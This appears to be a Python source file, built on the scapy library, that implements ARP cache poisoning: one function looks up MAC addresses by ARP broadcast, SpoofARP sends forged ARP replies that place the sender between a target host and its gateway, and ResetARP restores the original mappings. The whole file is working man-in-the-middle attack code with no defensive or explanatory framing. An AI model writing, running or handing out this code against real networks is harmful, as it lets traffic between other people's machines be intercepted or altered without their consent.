import time
from scapy.all import *
from scapy.config import conf

REQUIRED_FLAGS  = [ '-s', '-t', '-g' ]

DEFAULT_TIMEOUT = 1
DEFAULT_LENGTH  = 15

def GetMAC(address, timeout):
	carrier = Ether(dst="FF:FF:FF:FF:FF:FF")
	request = ARP(pdst=address)
	encapsulated = carrier / request

	answered = srp(encapsulated, timeout=timeout, verbose=False)[0]

	return answered[0][1].hwsrc if answered else None

def SpoofARP(targetip, gatewayip, sourcemac, targetmac, gatewaymac):
	for_target = ARP(op=2, psrc=gatewayip, pdst=targetip, hwsrc=sourcemac, hwdst=targetmac)
	for_gateway = ARP(op=2, psrc=targetip, pdst=gatewayip, hwsrc=sourcemac, hwdst=gatewaymac)

	send(for_target, count=1, verbose=False)
	send(for_gateway, count=1, verbose=False)

	return ((for_target, for_gateway))

def ResetARP(targetip, gatewayip, targetmac, gatewaymac):
	for_target = ARP(op=2, psrc=gatewayip, pdst=targetip, hwsrc=gatewaymac, hwdst=targetmac)
	for_gateway = ARP(op=2, psrc=targetip, pdst=gatewayip, hwsrc=targetmac, hwdst=gatewaymac)

	send(for_target, count=1, verbose=False)
	send(for_gateway, count=1, verbose=False)

	return ((for_target, for_gateway))